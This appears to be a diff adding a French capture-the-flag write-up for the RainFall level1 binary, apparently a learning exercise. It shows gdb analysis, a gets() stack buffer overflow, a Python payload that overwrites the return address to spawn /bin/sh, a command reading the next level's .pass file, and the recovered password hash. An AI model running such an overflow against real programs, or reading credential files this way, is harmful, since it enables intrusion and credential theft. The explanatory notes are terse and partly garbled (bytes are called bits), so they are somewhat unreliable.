@@ -1,0 +1,39 @@
+ls -la
+./level1
+attend une info
+
+gdb ./level1
+disas main
+il y a 22 ligne maintenant il faut comprendre ce quelle font
+
+
+(gdb) x/200s 0x8048584
+0x8048584:       "/bin/sh"
+
+(gdb) x/s 0x8048570
+0x8048570:       "Good... Wait what?\n"
+
+0x08048486 <+6>:     sub    $0x50,%esp
+taille de buffer
+0x50 = 80 + sb = 76
+
+b main
+puis
+info frame me permet de chopper l'eip
+eip at 0xbffff73c
+
+donc on sait que le buffer et de 76 bits
+on sait aussi que gets:
+gets () lira toutes les données disponibles dans le tableau, ce sera bien si l'utilisateur est sensé et entre moins de X octets.
+Cependant, s'ils entrent plus de X, gets()n'arrêtera pas d'écrire à la fin du tableau. Au lieu de cela,
+il continue d'écrire au-delà de la fin et dans la mémoire qu'il ne possède pas.
+
+on peut donc aller a la limit vue qu'il possede 76 bits et ensuite on redirige vers run 0x08048444
+
+je fait donc un script et il faut mettre la redirection de le sans inverse
+
+level1@RainFall:~$ echo  $(python -c 'print "."*76+"\x44\x84\x04\x08"') > /tmp/script
+level1@RainFall:~$ cat /tmp/script - | ./level1
+Good... Wait what?
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
